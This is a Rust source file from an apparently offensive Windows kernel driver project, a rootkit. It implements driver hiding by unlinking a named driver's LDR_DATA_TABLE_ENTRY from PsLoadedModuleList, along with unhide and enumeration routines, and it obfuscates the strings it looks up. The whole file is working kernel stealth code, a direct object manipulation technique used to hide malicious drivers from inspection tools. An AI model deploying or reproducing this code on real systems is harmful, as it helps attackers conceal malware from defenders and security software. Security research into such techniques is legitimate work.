use {
    obfstr::obfstr,
    common::structs::DriverInfo,
    crate::{error::ShadowError, uni}, 
    alloc::{string::{String, ToString}, vec::Vec}, 
    ntapi::ntldr::{LDR_DATA_TABLE_ENTRY, PLDR_DATA_TABLE_ENTRY}, 
    wdk_sys::{
        ntddk::MmGetSystemRoutineAddress, 
        LIST_ENTRY, NTSTATUS, PLIST_ENTRY, 
        STATUS_SUCCESS
    }
};

/// Represents driver manipulation operations.
/// 
/// The `Driver` struct provides methods to hide and unhide kernel drivers 
/// by modifying the `PsLoadedModuleList`, which tracks loaded drivers in the system.
pub struct Driver;

impl Driver {
    /// Hides a specified driver from the PsLoadedModuleList.
    /// 
    /// This function iterates over the `PsLoadedModuleList` to find a driver whose name matches 
    /// the provided `driver_name`. Once found, the driver is unlinked from the list, effectively hiding it 
    /// from tools that inspect the loaded drivers list.
    ///
    /// # Arguments
    ///
    /// * `driver_name` - A string slice containing the name of the driver to hide.
    ///
    /// # Returns
    ///
    /// * `Ok((LIST_ENTRY, LDR_DATA_TABLE_ENTRY))` - Returns a tuple containing the previous `LIST_ENTRY` 
    ///   and the `LDR_DATA_TABLE_ENTRY` of the hidden driver, which can be used later to restore the driver in the list.
    /// * `Err(ShadowError)` - If the driver is not found or a failure occurs during the process.
    pub unsafe fn hide_driver(driver_name: &str) -> Result<(LIST_ENTRY, LDR_DATA_TABLE_ENTRY), ShadowError> {
        // Convert "PsLoadedModuleList" to a UNICODE_STRING to get its address
        let ps_module = uni::str_to_unicode(obfstr!("PsLoadedModuleList"));

        // Get the address of the PsLoadedModuleList, which contains the list of loaded drivers
        let ldr_data = MmGetSystemRoutineAddress(&mut ps_module.to_unicode()) as *mut LDR_DATA_TABLE_ENTRY;
        if ldr_data.is_null() {
            return Err(ShadowError::NullPointer("LDR_DATA_TABLE_ENTRY"));
        }

        let list_entry = ldr_data as *mut LIST_ENTRY;
        let mut next = (*ldr_data).InLoadOrderLinks.Flink as *mut LIST_ENTRY;

        // Iterate through the loaded module list to find the target driver
        while next != list_entry {
            let current = next as *mut LDR_DATA_TABLE_ENTRY;

            // Convert the driver name from UTF-16 to a Rust string
            let buffer = core::slice::from_raw_parts((*current).BaseDllName.Buffer, ((*current).BaseDllName.Length / 2) as usize);
            let name = String::from_utf16_lossy(buffer);

            // Check if the current driver matches the target driver
            if name.contains(driver_name) {
                // The next driver in the chain
                let next = (*current).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
                
                // The previous driver in the chain
                let previous = (*current).InLoadOrderLinks.Blink as *mut LDR_DATA_TABLE_ENTRY;
                
                // Storing the previous list entry, which will be returned
                let previous_link = LIST_ENTRY {
                    Flink: next as *mut LIST_ENTRY,
                    Blink: previous as *mut LIST_ENTRY,
                };

                // Unlink the current driver
                (*next).InLoadOrderLinks.Blink = previous as *mut winapi::shared::ntdef::LIST_ENTRY;
                (*previous).InLoadOrderLinks.Flink = next as *mut winapi::shared::ntdef::LIST_ENTRY;

                // Make the current driver point to itself to "hide" it
                (*current).InLoadOrderLinks.Flink = current as *mut winapi::shared::ntdef::LIST_ENTRY;
                (*current).InLoadOrderLinks.Blink = current as *mut winapi::shared::ntdef::LIST_ENTRY;

                return Ok((previous_link, *current))
            }

            next = (*next).Flink;
        }

        // Return an error if the driver is not found
        Err(ShadowError::DriverNotFound(driver_name.to_string()))
    }

    /// Unhides a previously hidden driver by restoring it to the `PsLoadedModuleList`.
    /// 
    /// This function takes a previously hidden driver's `LIST_ENTRY` and `LDR_DATA_TABLE_ENTRY`
    /// and restores it back into the module list, making it visible again.
    ///
    /// # Arguments
    ///
    /// * `driver_name` - The name of the driver to unhide.
    /// * `list_entry` - A pointer to the `LIST_ENTRY` that was saved when the driver was hidden.
    /// * `driver_entry` - A pointer to the `LDR_DATA_TABLE_ENTRY` of the hidden driver.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - If the driver is successfully restored to the list.
    /// * `Err(ShadowError)` - If an error occurs during the restoration process.
    pub unsafe fn unhide_driver(driver_name: &str, list_entry: PLIST_ENTRY, driver_entry: PLDR_DATA_TABLE_ENTRY) -> Result<NTSTATUS, ShadowError> {
        // Restore the driver's link pointers
        (*driver_entry).InLoadOrderLinks.Flink = (*list_entry).Flink as *mut winapi::shared::ntdef::LIST_ENTRY;
        (*driver_entry).InLoadOrderLinks.Blink = (*list_entry).Blink as *mut winapi::shared::ntdef::LIST_ENTRY;

        // Link the driver back into the list
        let next = (*driver_entry).InLoadOrderLinks.Flink;
        let previous = (*driver_entry).InLoadOrderLinks.Blink;

        (*next).Blink = driver_entry as *mut winapi::shared::ntdef::LIST_ENTRY;
        (*previous).Flink = driver_entry as *mut winapi::shared::ntdef::LIST_ENTRY;
        
        Ok(STATUS_SUCCESS)
    }

    /// Enumerates all drivers currently loaded in the kernel.
    /// 
    /// This function iterates over the `PsLoadedModuleList` to gather information about all
    /// currently loaded drivers, such as their name, base address, and index. It stores the 
    /// gathered information in a `Vec<DriverInfo>` which is returned to the caller.
    /// 
    /// # Returns
    ///
    /// * `Ok(Vec<DriverInfo>)` - A vector of `DriverInfo` structs, each containing the name, base address,
    ///   and index of a loaded driver.
    /// * `Err(ShadowError)` - If the function fails to access the `PsLoadedModuleList` or any other
    ///   errors occur during the process.
    pub unsafe fn enumerate_driver() -> Result<Vec<DriverInfo>, ShadowError> {
        let mut drivers: Vec<DriverInfo> = Vec::with_capacity(276);

        // Convert "PsLoadedModuleList" to a UNICODE_STRING to get its address
        let ps_module = uni::str_to_unicode(obfstr!("PsLoadedModuleList"));

        // Get the address of the PsLoadedModuleList, which contains the list of loaded drivers
        let ldr_data = MmGetSystemRoutineAddress(&mut ps_module.to_unicode()) as *mut LDR_DATA_TABLE_ENTRY;
        if ldr_data.is_null() {
            return Err(ShadowError::NullPointer("LDR_DATA_TABLE_ENTRY"));
        }

        let current = ldr_data as *mut winapi::shared::ntdef::LIST_ENTRY;
        let mut next = (*ldr_data).InLoadOrderLinks.Flink;
        let mut count = 0;  

        // Iterate over the list of loaded drivers
        while next != current {
            let ldr_data_entry = next as *mut LDR_DATA_TABLE_ENTRY;

            // Get the driver name from the `BaseDllName` field, converting it from UTF-16 to a Rust string
            let buffer = core::slice::from_raw_parts(
                (*ldr_data_entry).BaseDllName.Buffer,
                ((*ldr_data_entry).BaseDllName.Length / 2) as usize,
            );

            // Prepare the name buffer, truncating if necessary to fit the 256-character limit
            let mut name = [0u16; 256];
            let length = core::cmp::min(buffer.len(), 255);
            name[..length].copy_from_slice(&buffer[..length]);

            // Populates the `DriverInfo` structure with name, address, and index
            drivers.push(DriverInfo {
                name,
                address: (*ldr_data_entry).DllBase as usize,
                index: count as u8,
            });

            count += 1;

            // Move to the next driver in the list
            next = (*next).Flink;
        }

        Ok(drivers)
    }
}
